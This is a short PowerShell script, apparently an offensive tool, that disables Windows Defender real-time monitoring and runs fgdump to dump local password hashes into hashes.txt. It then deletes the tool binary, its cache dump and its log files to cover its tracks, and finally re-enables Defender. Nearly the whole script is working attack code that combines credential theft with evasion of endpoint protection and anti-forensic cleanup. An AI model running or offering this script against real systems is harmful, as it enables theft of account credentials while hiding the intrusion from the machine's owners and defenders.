# Disable Windows defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Location of fgdump
$exeloc = "$PSScriptRoot\fgdump.exe"

# Run fgdump
start-process $exeloc

# Allow to create output before closing
Start-Sleep -s 5

# Close fgdump if it's hanging (results already piped)
$hang = Get-process -Name "fgdump" -ErrorAction SilentlyContinue
if ($hang) {
$hang.closeMainWindow()
Start-Sleep -s 3
if (!$hang.HasExited) {
    $hang | Stop-Process -Force
  }
}

# Output hashes will be stored in hashes.txt
Rename-Item -Path "$PSScriptRoot\127.0.0.1.pwdump" -NewName "hashes.txt"

# Delete fgdump and helper files
$FileName = "$PSScriptRoot\127.0.0.1.cachedump"
if (Test-Path $FileName)
{
  Remove-Item $FileName
}

$FileName = "$PSScriptRoot\fgdump.exe"
if (Test-Path $FileName)
{
  Remove-Item $FileName
}

ls *.fgdump-log -Recurse | foreach {rm $_}

# Reenable Windows defender
Set-MpPreference -DisableRealtimeMonitoring $false
